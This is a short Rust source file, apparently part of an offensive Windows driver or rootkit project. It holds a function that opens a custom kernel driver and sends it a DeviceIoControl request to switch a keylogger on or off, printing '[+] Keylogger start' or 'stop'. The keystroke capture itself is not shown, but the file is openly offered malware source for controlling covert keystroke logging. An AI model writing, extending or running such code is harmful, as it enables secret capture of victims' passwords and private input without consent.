use {
    std::{ffi::c_void, ptr::null_mut},
    windows_sys::Win32::System::IO::DeviceIoControl,
    shared::structs::Keylogger,
    crate::driver::open_driver,
};

pub fn keylogger(ioctl_code: u32, state: bool) {
    let h_file = open_driver().expect("Failed open driver");
    let status;
    let mut return_buffer = 0;
    let mut keylogger = Keylogger {
        enable: state
    };
    status = unsafe { 
        DeviceIoControl(
            h_file,
            ioctl_code,
            &mut keylogger as *mut _ as *mut c_void,
            std::mem::size_of::<Keylogger>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        if state {
            println!("[+] Keylogger start");
        } else {
            println!("[+] Keylogger stop");
        }

    }
}
